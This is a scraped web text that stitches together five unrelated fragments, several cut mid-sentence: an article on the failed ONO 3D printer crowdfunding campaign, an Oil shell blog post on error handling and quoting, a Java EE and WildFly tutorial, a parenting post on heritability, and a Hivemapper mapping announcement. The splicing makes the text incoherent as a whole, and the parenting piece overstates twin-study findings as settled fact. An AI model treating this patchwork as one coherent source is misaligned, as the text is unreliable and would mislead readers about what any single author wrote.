src="https://i1.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Factory-in-CHina.jpg?resize=700%2C450&amp;ssl=1" alt="ono 3d printer china factory" srcset="https://i1.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Factory-in-CHina.jpg?w=700&amp;ssl=1 700w, https://i1.wp.com/3dsourced.com/wp-content/uploads/2020/06/ONO-Factory-in-CHina.jpg?resize=300%2C193&amp;ssl=1 300w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1"><figcaption>To reassure backers, pictures such as this one were posted showing their production facility in China, producing units.</figcaption></figure><p>Take a deeper dive into the OLO team’s claims and some interesting information arises. Regarding the claim that the founders have 15 years’ experience in 3D printing, in another interview Filippo says he himself has 15 years, while Pietro was new to the 3D printing industry, his previous business experience concerns running a jazz club.</p><p>On further inspection of Fonderie Digitali, most of the companies the team claimed to comprise the Fonderie Digitali in their email sent to Maker’s Muse network are now defunct, and were already defunct in 2016 when they sent the email. On visiting the website now, none of these other companies are mentioned, only Solido3D and ONO. It does not appear to be a network, but an extra brand name to promote the team’s existing enterprises. The only legitimate, active company claimed in the 2016 email to comprise Fonderie Digitali was WASP, known for making <a href="https://3dsourced.com/3d-printers/delta-3d-printer/" target="_blank" rel="noreferrer noopener">delta 3D printers</a> that print extraordinarily fast, as well as for ceramic printing. WASP no longer feature in any part of the Fonderie Digitali website or contacts list.</p><p>On ONO Founder Filippo Moroni’s LinkedIn page, Solido3D and Fonderie Digitali are absent. In fact, despite claiming to have 15 years’ experience 3D printing, his LinkedIn employment history is non-existent between graduating from the Politecnico di Milano in 2002 and founding OLO in 2015. It is therefore impossible to verify any job history or experience when, according to his LinkedIn, he has never worked.</p><figure><div></div></figure><p>Suddenly, at New York Maker Faire 2017, 3D printing YouTuber Joel Telling – also known as 3D Printing Nerd – posted a video on October 1<sup>st</sup> titled “ONO Resin 3D Printer – Working!” with a member of ONO’s team, exclaiming he had seen a working prototype. Joel Telling’s reputation for honesty and reluctance to promote anything sub-par to his fanbase made this all the more reassuring.</p><p>ONO cut a hole in the side of one of their printers to show footage of the actual printing process during the vlog. The time lapse showed the print process in detail — they appeared to have a working prototype. Backers were happy. Such a powerful co-sign, as well as demonstrating proof of concept, meant surely it was just a matter of time until their ONO arrived.<span data-ez-name="3dsourced_com-mobile-leaderboard-1"></span></p><p>But then another year passed, and now two years after the original delivery date, nobody had received a printer. The controller board issues were still blamed, but even beyond this, months of updates concerned various difficulties involved in gaining the requisite certifications to ship the printers. Surely, if everything was safe and above board, this should not have taken so long.</p><h2><span id="StartEngine"></span>StartEngine<span></span></h2><p>Despite claiming they were readying to …</p></div></div>

  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>

</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me
know</a> what you think is missing.</p>

though I still need to update it for 2021.</p>
<p>I then proposed a focus on making the OSH language "production ready".  I'm
still going to work on the Oil language, but I need help finishing it.</p>

<p>The two most popular Java frameworks for server-side application development are <strong>Java EE</strong> (<em>Enterprise Edition</em>) and <strong>Spring</strong>.
Java EE is the <em>official</em> specification,
whereas Spring (unofficially) describes pretty much the same functionality,
but in many cases does so in a slightly different, often easier way.</p>
<p>(Later on, we'll go into greater detail about what the Java EE specification <em>is</em>, and what the term actually means.)</p>
<p>Should you use Java EE for your next projects, then? No, probably not.
Because what's important to know about Java EE, is that it's a comparatively heavy framework,
in terms of both setup and actually running it (in production).
The Java EE framework has greatly improved over the last decade,
but in terms of documentation, ease-of-use and operational simplicity,
it still doesn't match up against <a href="https://spring.io/projects/spring-boot">Spring Boot</a>.</p>
<p>Becoming knowledgeable in Java EE can still be worthwile, though.
For example, if you're looking to expand your software consultancy services to enterprise clients.
The <em>EE</em> part of Java EE (Enterprise Edition) is still very fitting,
as the framework is still almost exclusively used by the enterprises and BigCo's like
banks, insurance companies, government agencies, S&amp;P500, AEX, etc.</p>
<p>After a general introduction, as well as an overview of the framework's terminology,
we'll be setting up a Java EE project from scratch,
the full source code of which can be found on <a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.

<p>Java EE is a Java framework for developing server-side applications.
Among other things, it allows you to:</p>
<ul>
<li>create web APIs by accepting incoming HTTP requests</li>
<li>save and retrieve data from databases</li>
<li>send and receive messages from message brokers</li>
<li>connect to other backend systems via HTTP or SOAP</li>
<li>package applications into single units of deployment (.war files)</li>
</ul>
<p>The framework is very much geared towards enterprises and big corporations.
As such, it often ends up being popular in the domains of banking, insurance, accounting, finance, and manufacturing.</p>
<p>Like the programming language Java itself, Java EE used to be owned and managed by
<a href="https://en.wikipedia.org/wiki/Oracle_Corporation">Oracle</a>.
However, between 2017 and 2019, Oracle has transfered the ownership of the Java EE framework to the
<a href="https://en.wikipedia.org/wiki/Eclipse_Foundation">Eclipse Foundation</a>,
resulting in the framework being renamed <em>Jakarta EE</em> from version 8-9 onward.</p>

<p>It's going to take time for the term Jakarta EE to really catch on,
as the term Java EE is still very much ingrained in the corporate software industry.</p>
<p>We will be setting up a <strong>Java EE 8</strong> application in the build-along section of this article.</p>
<a href="#specifications-and-apis"><h2 id="specifications-and-apis">Specifications and APIs</h2></a>
<p>You should think of Java EE as a collection of <em>recipes</em>.
Recipes for typical pieces of functionality within a server application.
The technical term for a Java EE recipe is a <em>Java Specification Request</em> (JSR),
and each JSR describes a single unit of functionality within the Java EE framework.
For example:</p>
<ul>
<li>Creating a RESTful web API? <strong>JSR 370</strong></li>
<li>Validating incoming HTTP request bodies? <strong>JSR 380</strong></li>
<li>Connecting and reading (or writing) from a database? <strong>JSR 338</strong></li>
<li>Publishing messages to a message broker? <strong>JSR 343</strong></li>
</ul>
<p>This modular setup lets developers pick and choose which parts of the framework they want to use.</p>
<p>In an actual project, this typically means that your application has a single Maven dependency on the
<a href="https://mvnrepository.com/artifact/javax/javaee-api">full Java EE API</a>.</p>
<p>And what's interesting to understand, is that these Java EE API modules consist of nothing but interfaces, annotations and simple POJOs.
<em>There is no actual Java EE framework functionality in <strong>any</strong> of these API modules.</em>
The <em>real</em> implementation of the Java EE specifications, interfaces and annotations lies with the host environment
in which your Java application(s) will be running.
And such host environments are referred to as <strong>Java EE application servers</strong>, or simply <strong>(application) servers</strong>.</p>
<a href="#application-servers-and-implementations"><h2 id="application-servers-and-implementations">Application Servers and Implementations</h2></a>
<p>Java EE applications can't stand on their own—they require a <em>Java EE application server</em> to run in,
because the server provides the application with the facilities it needs to carry out its tasks.</p>
<p>This ties back to the story about JSRs (Java Specification Requests) from earlier.
Since your application only depends on Java EE <strong>API</strong> modules,
it's agnostic of the actual implementation of these modules (at least in theory 😅).
It's up to the application server to provide the actual (runtime) <strong>implementations</strong> to these API modules.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/application-server.svg" alt="application server diagram with multiple deployments and multiple runtime implementation JAR files"></p>
<p>The image above should make clear that Java EE application servers are to be thought of as facilitating environments,
in which multiple (unrelated) Java apps from different teams or departments
can simaltuneously run alongside each other, each application pseudo-isolated from its neighbours.</p>
<p>An application server doesn't have to implement every single Java EE specification, though.
Different servers can have varying degrees of specification <em>compliance</em>.</p>
<p>For example, the <a href="http://tomcat.apache.org/">Apache Tomcat</a> server only implements the web layer of the
Java EE specification and, as such, is referred to as a <strong>web server</strong>.
The <a href="https://www.wildfly.org/">JBoss WildFly</a> server, on the other hand,
implements every part of the Java EE specification, and can therefore be referred to as a <strong>(Full) Java EE application server</strong>.</p>
<p>Below's an overview of the most popular Java EE servers.</p>

<p>When deploying a Java EE application to some server, there will be lots of additional libraries available on the classpath at runtime.
These are all <em>implementation libraries</em> for the different Java EE API modules which the application might depend on.
So there's a big difference between <em>compile-time</em> API libraries and <em>runtime</em> implementation libraries.</p>
<hr>
<p>For example, by having a Maven <em>compile</em> dependency on the (full) <a href="https://mvnrepository.com/artifact/javax/javaee-api">Java EE API</a> library,
you'll be able to decorate your classes and methods with the <code>@Path</code> and <code>@GET</code> annotations (part of JSR 370)
and create a simple HTTP endpoint like this:</p>
<pre><code><span>@Path</span><span>(</span><span>"/ping"</span><span>)</span>
<span>public</span> <span>class</span> <span>PingResource</span> <span>{</span>

<p>In and of themselves, Java runtime annotations don't do anything.
That's why the application server has an <em>implementation library</em> for JSR 370, which it places on the classpath during runtime.
This implementation would then have a built-in mechanism which scans your application for all classes with the <code>@Path</code> annotation,
and register them as HTTP endpoints.</p>
<hr>
<p>Server developers typically choose to implement most of the <a href="https://jcp.org/en/jsr/all">500+</a> JSRs themselves.
Often, these implementation are then packaged into standalone libraries so that, in theory,
they can be re-used by other server developers.</p>
<p>As such, there are typically only 1 or 2 popular implementation libraries for each specification,
which may or may not find their way into the standard configuration of multiple different application servers over time.</p>

<a href="#jboss-wildfly"><h2 id="jboss-wildfly">JBoss WildFly</h2></a>
<p>JBoss used to be the name of a company which has developed one of the most popular Java EE application servers in the world:
<a href="https://www.redhat.com/en/technologies/jboss-middleware/application-platform">JBoss EAP</a> (Enterprise Application Platform).
The other application server which JBoss is known for, is called <a href="https://www.wildfly.org/">WildFly</a>.
The difference? Technically, nothing.
WildFly is the free community edition
and JBoss EAP is the paid enterprise edition (with official support)
of the <em>same</em> application server.</p>
<p>As a sidenote, JBoss actually got acquired by <a href="https://www.redhat.com/">RedHat</a> in 2006.
And then, in 2019, RedHat got acquired by <a href="https://www.ibm.com/">IBM</a>.
So the JBoss EAP / WildFly server is technically part of IBM's portfolio now,
together with IBM's self-developed Java EE application server called <a href="https://www.ibm.com/cloud/websphere-application-platform/">WebSphere</a>.</p>
<p>We'll be working with the <strong>JBoss WildFly</strong> application server (version <strong>20</strong>) in the build-along section of this article.</p>
<a href="#project-overview"></a>
<p>We'll be working on a Java EE application with the following features:</p>
<ul>
<li>customers can sign up via the <code>POST /accounts</code> endpoint<ul>
<li>their <code>name</code> and <code>email</code> are saved into the database</li>
<li>they're sent a welcome e-mail</li>
</ul>
</li>
<li>all accounts can be queried via the <code>GET /accounts</code> endpoint</li>
<li>a single account can be queried via the <code>GET /accounts/{id}</code> endpoint</li>
</ul>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/project-overview.svg" alt="diagram containing the basic 3-tiered architecture: resource, service and repository"></p>
<p>You can find the full source code of the final application on
<a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.
If you would like to follow along, please make sure to have the following tools installed:</p>
<ul>
<li><strong>Java 11</strong> - newer language versions aren't supported by the WildFly version we're going to pick later</li>
<li><strong>Maven</strong></li>
<li><strong>Docker Compose</strong> - for running the database locally</li>
<li><strong>IntelliJ</strong></li>
</ul>
<a href="#wildfly-setup"></a>
<p>Start out by downloading the <strong>JBoss WildFly 20.0.0.Final</strong> application server (Java EE Full &amp; Web Distribution)
from the official <a href="https://www.wildfly.org/downloads/">downloads page</a>.
Once it's downloaded, unzip the the archive to a convenient location or simply leave it
inside your <code>~/Downloads/</code> folder (which is what I will do).</p>
<p>I shall refer to the WildFly root directory as <code>$JBOSS_HOME</code> from now on,
which would resolve to <code>~/Downloads/wildfly-20.0.0.Final/</code> on my system.</p>
<p>To <em>start</em> this server, simply <code>cd</code> into the <code>$JBOSS_HOME/bin/</code> folder and run the <code>./standalone.sh</code> script.
After a few seconds, you should be able to visit <a href="http://localhost:8080/">localhost:8080</a>
and be greeted with the following welcome screen.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/wildfly-welcome-screen.png" alt="WildFly welcome screen"></p>
<p>(To stop the server,
simply press Cmd + C or Ctrl + C from the terminal window where the <code>./standalone.sh</code> script is running.)</p>
<p>WildFly also comes with a useful management dashboard, available at <a href="http://localhost:9990/">localhost:9990</a>,
from where we'll be able to view runtime stats about WildFly itself and all Java EE applications deployed to it.
In order to access the dashboard, we'll have to create a management user first, though.
To do so, <code>cd</code> into <code>$JBOSS_HOME/bin/</code> and run the <code>./add-user.sh</code> script.</p>

<p>Every parent should read this article: <a href="https://www.todaysparent.com/family/nature-vs-nurture-does-parenting-even-matter/">Does parenting even matter?</a></p>



<p>Here are some money quotes.</p>



<p><em>On the things we think are important:</em></p>



<blockquote><p>Things like which school your child goes to, whether they travel, how many books you read them when they’re small and how hard (or if) you push them into certain activities, aren’t likely to have much, if any, effect on who they fundamentally are now, or who they become.</p></blockquote>



<p><em>On changing their personality:</em></p>



<blockquote><p>If your child is defiant and strong-willed, they’re almost certainly going to spend their life challenging authority whether you run your household on a strict military timetable or unschool them in a yurt.</p></blockquote>



<p><em>On setting them up for success:</em></p>



<blockquote><p>Many character traits widely assumed to be the result of environmental factors and social conditioning—like curiosity, diligence, intelligence, fastidiousness, academic inclination and drive—are, in fact, highly heritable.&nbsp;</p></blockquote>



<p><em>On why parenting still matters:</em></p>



<blockquote><p>Parenting does matter—of course it does—just not in the overly complicated, competitive, anxiety-ridden way most of us have been led to believe. Our kids are born who they are. As parents, it’s our job to love, support, accept and enjoy them. The rest is gravy.</p></blockquote>



<p>The book <a href="https://www.goodreads.com/book/show/10266902-selfish-reasons-to-have-more-kids">Selfish Reasons to Have More Kids</a> is all about this concept. If you meet a very low bar for parenting then your kids are going to turn out how they’re going to turn out. </p>



<p>There are decades of identical twin and adoption studies to back it up. Those studies have only linked a few things to upbringing. Religious and political affiliation are two examples. </p>



<p>Everything else has little to no correlation. That includes salary, education level, health (smoking/drinking, cavities, etc.), grades in school, criminal behavior, etc. It’s genetics all the way down for those.</p>



<p>That’s disturbing, right? There’s nothing I can do to help my kids grow up to be healthy or well paid or educated? Yeah, but it’s also freeing. Our job is to love our kids and give them happy memories to look back on. We can focus on the fun stuff, because that’s the stuff that matters. The rest, as the article says, is gravy.</p>

We take them for granted and yet they’re critical and everywhere. But maps cost billions to produce and therefore don’t get updated frequently enough for businesses and machines that require up-to-date data.</p><p id="a0c7">To create a fresh and intelligent 3D map of the world, <a href="http://hivemapper.com/" rel="noopener">Hivemapper</a> combines a new software approach to making maps, with a <a href="https://hivemapper.com/collectors" rel="noopener">mapping network</a> of commodity drones and <a href="https://hivemapper.com/open-dash" rel="noopener">dashcam</a> to grow and update the map. The global 3D map we are building is scaling and updating four times faster, and at a fraction of the cost, of traditional mapping companies.</p><p id="2123">By comparison, where Google Maps deploys a small number of highly specialized cars driving around the world, we engage with an unlimited number of contributors who only need a dashcam or off-the-shelf drone to participate. Here’s a quick peek:</p></div></div><div><div><p id="255d">Since February 2020, collectors in the Hivemapper mapping network have been rapidly adding to and growing the global map:</p><ul><li id="8835"><strong>9,000 sq km </strong>— in more than 80 countries — have been mapped</li><li id="7fa3"><strong>50% monthly growth</strong> of the global map</li><li id="248f">In just one week, areas of the map have grown from <strong>1 to 90 sq. km</strong> — about three Manhattans</li></ul><p id="214d">Hivemapper regards a decentralized mapping network as critical mapping infrastructure necessary to democratize mapping, make mapping a utility like storage and bandwidth, and fuel the business use-cases and autonomous machines that require up-to-date 3D maps.</p><p id="5fbc">In a static world — no new roads, no closures, no natural disasters, no new development existing approaches to building and updating 2D and 3D maps are satisfactory. Yet, the physical world is changing faster than ever. Urbanization, climate change, autonomous transportation, and now pandemics are driving 15% of the global road network to change annually.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*bvdIk7dlMi1TC6r_baxykg.png" width="2280" height="1288" srcset="https://miro.medium.com/max/552/1*bvdIk7dlMi1TC6r_baxykg.png 276w, https://miro.medium.com/max/1104/1*bvdIk7dlMi1TC6r_baxykg.png 552w, https://miro.medium.com/max/1280/1*bvdIk7dlMi1TC6r_baxykg.png 640w, https://miro.medium.com/max/1400/1*bvdIk7dlMi1TC6r_baxykg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*bvdIk7dlMi1TC6r_baxykg.png?q=20"></p></div></div></div><figcaption>The world is changes faster, and today’s maps cannot keep up</figcaption></figure><p id="49e3">Today, Big Tech mapping companies spend billions of dollars to deploy fleets of highly specialized vehicles, fly airplanes equipped with advanced camera systems, and even launch satellites. Given the enormous expense, maps are rarely updated and companies apply expensive and restrictive licensing agreements to their use. For businesses that rely on maps for mission critical monitoring and navigation an out-of-date map is a serious issue:</p><ul><li id="f163">Google Maps was not updated for 12 months after the devastating fires in Santa Rosa (California) destroyed homes and infrastructure.</li><li id="89a6">Because Google and others are too slow to update, a delivery company operating in the Detroit area had to collect their own data for maps using multiple tools.</li><li id="750d">Each year 20% of structures in Dallas change; a delivery company hires teams of people to manually update these to reduce costly rejected deliveries.</li></ul><p id="2b88">However important maps already are, updated 3D maps are a mission critical piece of infrastructure for the navigation systems of autonomous vehicles. Feeding an out-of-date map to an autonomous vehicle is potentially catastrophic. The lack of large scale affordable and accurate 3D maps remain a key obstacle preventing the autonomous transportation promise from becoming an everyday reality.</p><p id="673f">We believe there are three pillars required to build and deliver a decentralized mapping network capable of turning 3D maps into an affordable and accessible utility for businesses and machines that require up-to-date maps.</p><p id="b314">When anyone with a commodity dashcam or drone can collect and contribute video it shifts the challenge from a costly logistics and hardware problem into a challenging software opportunity.</p><p id="1ba7">The <a rel="noopener" href="https://blog.hivemapper.com/engineering-a-living-map-introduction-4d4b3e5f28e8">technical breakthrough</a> of Hivemapper is that, leveraging modern compute power we can take nearly any source video of the physical world and convert it into an accurate 3D map. Additionally, the Hivemapper technology does not require all of the video to be produced by one source in a highly structured and organized way. Instead, Hivemapper receives, processes and transforms disparate videos into an accurate and intelligent 3D map.</p><p id="22f6">Think of the Hivemapper map as a puzzle where each video uploaded to Hivemapper forms one piece. The puzzle is only complete when each piece is in its proper place and Hivemapper makes all of the individual pieces come together. This core technology enables a decentralized network of contributors.</p><p id="e3d4">Our approach combining commodity video collections tools from different collectors with our mapping software produced this 50 sq km map around <a href="https://hivemapper.com/map?content=terrain&amp;content=context&amp;content=hmmap&amp;content-filters=color,highacc&amp;overlays=osm-planet&amp;view=-2698768.77,-4293712.18,3856567.37,-2.296,-0.709" rel="noopener">Stanford University</a>:</p></div></div><div><div><div><figure><div></div><figcaption>50 sq km of Silicon Valley built by dashcam and drones</figcaption></figure></div></div></div><div><div><p id="abad">How we built this map</p><ul><li id="9681">5 different video collectors, separately and on different days, collected video and 